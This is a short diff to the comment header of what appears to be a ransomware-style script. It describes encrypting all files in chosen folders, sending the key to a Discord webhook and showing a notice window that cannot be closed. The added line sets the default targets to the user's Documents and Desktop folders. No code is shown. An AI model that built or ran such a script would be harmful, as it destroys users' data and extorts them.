@@ -3,6 +3,7 @@
 SYNOPSIS
 This script encrypts all files within selected folders, posts the encryption key to a Discord webhook, and starts a non closable window
 with a notice to the user.
+By default this script encrypts all user data in Documents and Desktop folders.
 
 **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**
 
